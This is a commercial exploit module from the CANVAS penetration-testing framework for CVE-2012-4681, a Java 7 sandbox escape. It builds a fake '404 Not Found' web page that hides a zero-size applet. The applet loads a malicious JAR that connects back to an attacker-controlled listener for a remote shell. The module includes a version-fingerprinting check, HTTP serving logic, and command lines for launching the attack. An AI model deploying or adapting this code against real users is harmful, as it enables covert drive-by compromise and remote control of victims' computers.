#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2012
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")
    
import canvasengine
from exploitutils import *
from httpclientside import httpclientside

NAME                            = "Java forName/getField Method Invocation Sandbox Bypass"
DESCRIPTION                     = "Java forName/getField Method Invocation Sandbox Bypass an attacker to bypass security restrictions and therefore escape from the sandbox." 
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Sun"
DOCUMENTATION["Repeatability"]  = "Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"]       = "CVE-2012-4681"
DOCUMENTATION["References"]     = """http://pastie.org/4594319"""
DOCUMENTATION["Date public"]    = "07/26/2012"
DOCUMENTATION["Notes"]         = """
There is a method invocation vulnerability using sun.awt.SunToolkit.getField() 
This vulnerability can then be used together with some reflection tricks to disable the Java Security Manager to escape the sandbox.

Affected versions
JDK and JRE 7 Update 6 and earlier

Note: this does not work under JRE 6 due to the getField() function not working correctly.

Tested on:
    - Windows 7 SP1 with JDK/JRE 7 and 7 update 6
    - Windows XP SP3 with JDK/JRE 7 and 7 update 6

Needs more testing (likley to work on other targets)

To run from command line, first start the listener (UNIVERSAL):
python commandlineInterface.py -l 192.168.1.10 -p 5555 -v 17
And then run the exploit from clientd:
python ./exploits/clientd/clientd.py -l 192.168.1.10 -d 5555 -O server_port:8080 -O allowed_attack_modules:java_forName_getField -O allowed_recon_modules:js_recon -O auto_detect_exploits:0

"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["UNIX"], ["Windows"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'

TARGETS = { 0 : ["JDK/JRE <= 7 Update 6"],
           # 1 : ["SDK/JRE <= 1.4.2_35"],
        }


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME
        self.htmlfile           = "index.html"
        # filename is used in the actual http server
        self.filename           = self.htmlfile
        self.jarfile            = "CVE-2012-4681.jar"
        self.jarfileName        = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".jar"
        # in standalone mode we want it to adhere
        # to manually chosen callback settings ...
        self.autoFind           = False
        # this exploit can not time out ...
        # it remains active in the browser ...
        self.refresh_rate       = 0
        return
    
    def neededListenerTypes(self):
        if self.HTTPMOSDEF:
            if self.useSSLMOSDEF:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]
    
    # Vulnerability detection
    def is_vulnerable( self, info_dict ):
        major, minor, build, patch = self.getJavaVersions(info_dict)
        self.log("Checking if target is vulnerable. Detected Java version: major=%s, minor=%s, build=%s, patch=%s" % (major, minor, build, patch))
        if not major:
            # No Java, piss off
            return 0 
        if major == 1:
            if minor == 7:
                if build == 0:
                    if patch <= 6:
                        return 81
                # Detected Java version: major=1,
                # minor=7, build=0, patch=6
        return 0

    def displayVersions(self):
        for t in TARGETS.keys():
            print "%d: %s" % (t, TARGETS[t][0])
        return
    
    def run(self):
        self.host       = self.target.interface
        self.htmlfile   = self.argsDict.get('htmlfile', self.htmlfile)
        html            = self.makefile()
        rar             = self.makedownloadfile()
        
        self.log("[+] Opening HTML %s for output" % self.htmlfile)
        fd = file(self.htmlfile, 'wb+')
        fd.write(html)
        fd.close()
        self.log("[+] wrote to %s" % self.htmlfile)
        
        self.log("[+] Opening JAR %s for output" % self.jarfile)
        fd = file(self.jarfile, 'wb+')
        fd.write(rar)
        fd.close()
        self.log("[+] Wrote to %s" % self.jarfile)

        self.log("[+] Place both files together in malicious webroot")        
        return 1

    ## SPIKE Proxy Callbacks ...

    def makedownloadfile(self):
        return file('Resources/%s' % self.jarfile, 'rb').read()
        
    def makefile(self):
        html = """
        <html>
            <head>
                <title>404 Not Found</title>
            </head>
            <body>
                <!-- Site 404 Handler Applet -->
                <applet archive="%s" code="SiteError.class" width="0" height="0">
                    <param name="host" value="%s">
                    <param name="port" value="%d">
                    <param name="type" value="%d">
                    <param name="id" value="%d">
                    <param name="conn_type" value="%d">
                    <param name="use_ssl" value="%s">
                </applet>
                <h1>Not Found</h1>
                <p>The requested URL /%s was not found on this server.</p>
                <hr>
            </body>
        </html>
        """ % (self.jarfileName,
               self.callback.ip,
               self.callback.port,
               self.engine.getMosdefType(canvasengine.JAVASERVER),
               self.engine.getNewMosdefID(self),
               1 if self.HTTPMOSDEF else 0,
               str(self.useSSLMOSDEF).lower(),
               self.htmlfile) 

        return html
        
    def makesploit(self, clientheader, clientbody):    
        # we are platform independent
        from libs.spkproxy import header, body
        h           = header('SERVER')
        b           = body()
        user_agent  = clientheader.getStrValue(['User-Agent'])
        request = clientheader.URL
        self.log("[+] Requesting: %s" % request)
        self.log("[+] User agent of connecting host: %s" % user_agent)  
        
        if clientheader.URL.count(self.htmlfile):
            self.log("[+] Sending HTML")
            b.setBody(self.makefile())
            
        elif clientheader.URL.count(self.jarfileName):
            self.log("[+] Sending JAR")
            data = self.makedownloadfile()
            self.log("[+] Sending %d bytes" % len(data))
            h.addHeader('Content-type', 'binary/octet-stream')
            h.addHeader('Connection', 'close')
            b.setBody(data)
            
        elif clientheader.URL.count("done"):
            self.log("Did not load Java applet!")
            return None, None
        else:
            self.log("[+] Redirect to %s" % self.htmlfile)
            h.status = '302'
            h.addHeader('Location', self.htmlfile)
            h.addHeader('Content-Type', 'text/html')

        return h,b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    
